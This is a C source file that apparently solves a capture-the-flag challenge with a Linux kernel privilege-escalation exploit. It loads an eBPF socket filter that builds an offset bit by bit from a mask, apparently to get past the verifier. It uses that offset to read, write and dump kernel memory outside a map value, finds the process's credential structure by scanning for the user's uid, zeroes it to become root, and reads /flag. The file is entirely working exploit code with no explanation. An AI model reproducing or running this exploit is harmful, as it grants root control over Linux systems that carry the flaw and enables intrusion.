#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#ifndef BPF_OBJ_NAME_LEN
#define BPF_OBJ_NAME_LEN 16
#endif

#ifndef BPF_PSEUDO_MAP_FD
#define BPF_PSEUDO_MAP_FD 1
#endif

#define VALUE_SIZE 0x7000
#define REQ_OFF_MASK 0x00
#define REQ_OFF_CMD 0x08
#define REQ_OFF_WRITEVAL 0x10
#define REQ_OFF_OUT 0x18
#define REQ_OFF_DUMP 0x100
#define DUMP_LEN (VALUE_SIZE - REQ_OFF_DUMP)

enum {
	CMD_READ64 = 0,
	CMD_WRITE64 = 1,
	CMD_DUMP = 2,
};

struct request {
	uint64_t mask;
	uint64_t cmd;
	uint64_t writeval;
	uint64_t out;
	uint8_t pad[REQ_OFF_DUMP - 32];
	uint8_t dump[DUMP_LEN];
};

static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size) {
	return (int)syscall(__NR_bpf, cmd, attr, size);
}

static uint32_t kernel_version_code(void) {
	struct utsname uts;
	if (uname(&uts) != 0)
		return 0;
	unsigned major = 0, minor = 0, patch = 0;
	sscanf(uts.release, "%u.%u.%u", &major, &minor, &patch);
	return (major << 16) | (minor << 8) | patch;
}

static int bpf_map_create_array(uint32_t value_size) {
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.map_type = BPF_MAP_TYPE_ARRAY;
	attr.key_size = 4;
	attr.value_size = value_size;
	attr.max_entries = 1;
	memcpy(attr.map_name, "pwnmap", 6);
	return sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_map_update(int map_fd, uint32_t key, const void *value) {
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.map_fd = (uint32_t)map_fd;
	attr.key = (uint64_t)(uintptr_t)&key;
	attr.value = (uint64_t)(uintptr_t)value;
	attr.flags = BPF_ANY;
	return sys_bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_map_lookup(int map_fd, uint32_t key, void *value_out) {
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.map_fd = (uint32_t)map_fd;
	attr.key = (uint64_t)(uintptr_t)&key;
	attr.value = (uint64_t)(uintptr_t)value_out;
	return sys_bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static struct bpf_insn insn_alu64_imm(uint8_t op, uint8_t dst, int32_t imm) {
	return (struct bpf_insn){.code = BPF_ALU64 | BPF_K | op, .dst_reg = dst, .src_reg = 0, .off = 0, .imm = imm};
}

static struct bpf_insn insn_alu64_reg(uint8_t op, uint8_t dst, uint8_t src) {
	return (struct bpf_insn){.code = BPF_ALU64 | BPF_X | op, .dst_reg = dst, .src_reg = src, .off = 0, .imm = 0};
}

static struct bpf_insn insn_mov64_imm(uint8_t dst, int32_t imm) { return insn_alu64_imm(BPF_MOV, dst, imm); }
static struct bpf_insn insn_mov64_reg(uint8_t dst, uint8_t src) { return insn_alu64_reg(BPF_MOV, dst, src); }

static struct bpf_insn insn_jmp_imm(uint8_t op, uint8_t dst, int32_t imm, int16_t off) {
	return (struct bpf_insn){.code = BPF_JMP | BPF_K | op, .dst_reg = dst, .src_reg = 0, .off = off, .imm = imm};
}

static struct bpf_insn insn_call(int32_t func) { return (struct bpf_insn){.code = BPF_JMP | BPF_CALL, .imm = func}; }
static struct bpf_insn insn_exit(void) { return (struct bpf_insn){.code = BPF_JMP | BPF_EXIT}; }

static struct bpf_insn insn_ldx(uint8_t size, uint8_t dst, uint8_t src, int16_t off) {
	return (struct bpf_insn){.code = BPF_LDX | BPF_MEM | size, .dst_reg = dst, .src_reg = src, .off = off};
}

static struct bpf_insn insn_stx(uint8_t size, uint8_t dst, uint8_t src, int16_t off) {
	return (struct bpf_insn){.code = BPF_STX | BPF_MEM | size, .dst_reg = dst, .src_reg = src, .off = off};
}

static struct bpf_insn insn_st(uint8_t size, uint8_t dst, int16_t off, int32_t imm) {
	return (struct bpf_insn){.code = BPF_ST | BPF_MEM | size, .dst_reg = dst, .off = off, .imm = imm};
}

static void insn_ld_map_fd(struct bpf_insn *out, uint8_t dst, int map_fd) {
	out[0] = (struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = dst, .src_reg = BPF_PSEUDO_MAP_FD, .imm = map_fd};
	out[1] = (struct bpf_insn){0};
}

static void fatal_perror(const char *msg) {
	perror(msg);
	exit(1);
}

static void set_rlimits(void) {
	struct rlimit rl = {.rlim_cur = RLIM_INFINITY, .rlim_max = RLIM_INFINITY};
	(void)setrlimit(RLIMIT_MEMLOCK, &rl);
}

static int bpf_prog_load_socket_filter(int map_fd, char *log_buf, uint32_t log_sz) {
	struct bpf_insn prog[256];
	size_t n = 0;

	/* key=0 on stack at fp-4 */
	prog[n++] = insn_st(BPF_W, BPF_REG_10, -4, 0);

	/* r1 = map fd */
	insn_ld_map_fd(&prog[n], BPF_REG_1, map_fd);
	n += 2;
	/* r2 = &key */
	prog[n++] = insn_mov64_reg(BPF_REG_2, BPF_REG_10);
	prog[n++] = insn_alu64_imm(BPF_ADD, BPF_REG_2, -4);
	/* call map_lookup_elem */
	prog[n++] = insn_call(BPF_FUNC_map_lookup_elem);
	/* if r0 == 0 goto exit */
	prog[n++] = insn_jmp_imm(BPF_JEQ, BPF_REG_0, 0, 2);
	prog[n++] = insn_mov64_imm(BPF_REG_0, 0);
	prog[n++] = insn_exit();

	/* r6 = value ptr */
	prog[n++] = insn_mov64_reg(BPF_REG_6, BPF_REG_0);

	/* r7 = mask */
	prog[n++] = insn_ldx(BPF_DW, BPF_REG_7, BPF_REG_6, REQ_OFF_MASK);
	/* r8 = i = 0 */
	prog[n++] = insn_mov64_imm(BPF_REG_8, 0);
	/* r9 = off = 0 */
	prog[n++] = insn_mov64_imm(BPF_REG_9, 0);

	size_t loop_start = n;
	/* r1 = r7; r1 &= 1 */
	prog[n++] = insn_mov64_reg(BPF_REG_1, BPF_REG_7);
	prog[n++] = insn_alu64_imm(BPF_AND, BPF_REG_1, 1);
	/* if r1 == 0 skip_add (jump over 4 insns) */
	prog[n++] = insn_jmp_imm(BPF_JEQ, BPF_REG_1, 0, 4);
	/* r2 = 1; r2 <<= r8; r9 += r2 */
	prog[n++] = insn_mov64_imm(BPF_REG_2, 1);
	prog[n++] = insn_alu64_reg(BPF_LSH, BPF_REG_2, BPF_REG_8);
	prog[n++] = insn_alu64_reg(BPF_ADD, BPF_REG_9, BPF_REG_2);
	/* skip_add: r7 >>= 1; r8 += 1 */
	prog[n++] = insn_alu64_imm(BPF_RSH, BPF_REG_7, 1);
	prog[n++] = insn_alu64_imm(BPF_ADD, BPF_REG_8, 1);
	/* if r8 < 64 goto loop_start */
	int16_t back = (int16_t)(loop_start - (n + 1));
	prog[n++] = insn_jmp_imm(BPF_JLT, BPF_REG_8, 64, back);

	/* r3 = cmd */
	prog[n++] = insn_ldx(BPF_DW, BPF_REG_3, BPF_REG_6, REQ_OFF_CMD);

	/* r1 = target = r6 + r9 */
	prog[n++] = insn_mov64_reg(BPF_REG_1, BPF_REG_6);
	prog[n++] = insn_alu64_reg(BPF_ADD, BPF_REG_1, BPF_REG_9);

	/* if cmd == DUMP goto do_dump */
	prog[n++] = insn_jmp_imm(BPF_JEQ, BPF_REG_3, CMD_DUMP, 10);
	/* if cmd == WRITE goto do_write */
	prog[n++] = insn_jmp_imm(BPF_JEQ, BPF_REG_3, CMD_WRITE64, 4);

	/* do_read: r2 = *(u64*)target; *(u64*)(r6+OUT)=r2; r0=0; exit */
	prog[n++] = insn_ldx(BPF_DW, BPF_REG_2, BPF_REG_1, 0);
	prog[n++] = insn_stx(BPF_DW, BPF_REG_6, BPF_REG_2, REQ_OFF_OUT);
	prog[n++] = insn_mov64_imm(BPF_REG_0, 0);
	prog[n++] = insn_exit();

	/* do_write: r2 = writeval; *(u64*)target=r2; r0=0; exit */
	prog[n++] = insn_ldx(BPF_DW, BPF_REG_2, BPF_REG_6, REQ_OFF_WRITEVAL);
	prog[n++] = insn_stx(BPF_DW, BPF_REG_1, BPF_REG_2, 0);
	prog[n++] = insn_mov64_imm(BPF_REG_0, 0);
	prog[n++] = insn_exit();

	/* do_dump: dst=r2=r6+REQ_OFF_DUMP; i=r4=0 */
	prog[n++] = insn_mov64_reg(BPF_REG_2, BPF_REG_6);
	prog[n++] = insn_alu64_imm(BPF_ADD, BPF_REG_2, REQ_OFF_DUMP);
	prog[n++] = insn_mov64_imm(BPF_REG_4, 0);

	size_t dump_loop = n;
	/* r5 = *(u64*)src; *(u64*)dst=r5; src+=8; dst+=8; i+=8 */
	prog[n++] = insn_ldx(BPF_DW, BPF_REG_5, BPF_REG_1, 0);
	prog[n++] = insn_stx(BPF_DW, BPF_REG_2, BPF_REG_5, 0);
	prog[n++] = insn_alu64_imm(BPF_ADD, BPF_REG_1, 8);
	prog[n++] = insn_alu64_imm(BPF_ADD, BPF_REG_2, 8);
	prog[n++] = insn_alu64_imm(BPF_ADD, BPF_REG_4, 8);
	int16_t dump_back = (int16_t)(dump_loop - (n + 1));
	prog[n++] = insn_jmp_imm(BPF_JLT, BPF_REG_4, (int32_t)DUMP_LEN, dump_back);
	prog[n++] = insn_mov64_imm(BPF_REG_0, 0);
	prog[n++] = insn_exit();

	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
	attr.insn_cnt = (uint32_t)n;
	attr.insns = (uint64_t)(uintptr_t)prog;
	static const char license[] = "GPL";
	attr.license = (uint64_t)(uintptr_t)license;
	attr.log_buf = (uint64_t)(uintptr_t)log_buf;
	attr.log_size = log_sz;
	attr.log_level = (log_buf && log_sz) ? 1 : 0;
	attr.kern_version = kernel_version_code();

	return sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

static void trigger(int sock) {
	static const char one = 'A';
	if (write(sock, &one, 1) != 1)
		fatal_perror("write(trigger)");
}

static uint64_t do_read64(int map_fd, int sock, struct request *req, uint64_t mask) {
	req->mask = mask;
	req->cmd = CMD_READ64;
	uint32_t key = 0;
	if (bpf_map_update(map_fd, key, req) != 0)
		fatal_perror("map_update(read)");
	trigger(sock);
	if (bpf_map_lookup(map_fd, key, req) != 0)
		fatal_perror("map_lookup(read)");
	return req->out;
}

static void do_write64(int map_fd, int sock, struct request *req, uint64_t mask, uint64_t value) {
	req->mask = mask;
	req->cmd = CMD_WRITE64;
	req->writeval = value;
	uint32_t key = 0;
	if (bpf_map_update(map_fd, key, req) != 0)
		fatal_perror("map_update(write)");
	trigger(sock);
}

static void do_dump(int map_fd, int sock, struct request *req, uint64_t mask) {
	req->mask = mask;
	req->cmd = CMD_DUMP;
	uint32_t key = 0;
	if (bpf_map_update(map_fd, key, req) != 0)
		fatal_perror("map_update(dump)");
	trigger(sock);
	if (bpf_map_lookup(map_fd, key, req) != 0)
		fatal_perror("map_lookup(dump)");
}

static int try_read_flag(void) {
	int fd = open("/flag", O_RDONLY);
	if (fd < 0)
		return -1;
	char buf[256];
	ssize_t n = read(fd, buf, sizeof(buf) - 1);
	if (n < 0)
		fatal_perror("read(/flag)");
	buf[n] = 0;
	write(1, buf, (size_t)n);
	write(1, "\n", 1);
	close(fd);
	return 0;
}

int main(void) {
	set_rlimits();

	int map_fd = bpf_map_create_array(VALUE_SIZE);
	if (map_fd < 0)
		fatal_perror("bpf_map_create");

	char *log_buf = calloc(1, 1 << 20);
	if (!log_buf)
		fatal_perror("calloc(log)");

	int prog_fd = bpf_prog_load_socket_filter(map_fd, log_buf, 1 << 20);
	if (prog_fd < 0) {
		fprintf(stderr, "BPF verifier log:\n%s\n", log_buf);
		fatal_perror("bpf_prog_load");
	}

	int sp[2];
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sp) != 0)
		fatal_perror("socketpair");
	if (setsockopt(sp[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) != 0)
		fatal_perror("setsockopt(SO_ATTACH_BPF)");

	struct request *req = calloc(1, sizeof(*req));
	if (!req)
		fatal_perror("calloc(req)");

	uint32_t uid = (uint32_t)getuid();

	/* Quick sanity reads from just before the map value. For a normal ARRAY map,
	 * these should generally be non-zero once we're actually reading OOB.
	 */
	uint64_t v1 = do_read64(map_fd, sp[0], req, (uint64_t)(int64_t)-0x100);
	uint64_t v2 = do_read64(map_fd, sp[0], req, (uint64_t)(int64_t)-0x200);
	fprintf(stderr, "debug: read[-0x100]=0x%016llx read[-0x200]=0x%016llx uid=%u\n",
		(unsigned long long)v1, (unsigned long long)v2, uid);

	const int64_t scan_span = 64LL * 1024 * 1024; /* 64 MiB each direction */
	const int64_t step = (int64_t)DUMP_LEN - 0x100; /* overlap windows a bit */
	for (int64_t base = -scan_span; base < scan_span; base += step) {
		uint64_t mask = (uint64_t)base;
		do_dump(map_fd, sp[0], req, mask);

		for (uint32_t off = 0; off + 8 * 4 <= DUMP_LEN; off += 4) {
			uint32_t *p = (uint32_t *)&req->dump[off];
			int ok = 1;
			for (int i = 0; i < 8; i++) {
				if (p[i] != uid) {
					ok = 0;
					break;
				}
			}
			if (!ok)
				continue;

			uint64_t cred_mask = mask + off - 8; /* pattern starts at cred+8 */
			do_write64(map_fd, sp[0], req, cred_mask + 8, 0);
			do_write64(map_fd, sp[0], req, cred_mask + 16, 0);
			do_write64(map_fd, sp[0], req, cred_mask + 24, 0);
			do_write64(map_fd, sp[0], req, cred_mask + 32, 0);

			if (getuid() == 0) {
				(void)try_read_flag();
				return 0;
			}
		}
	}

	fprintf(stderr, "failed to find/patch cred\n");
	return 1;
}
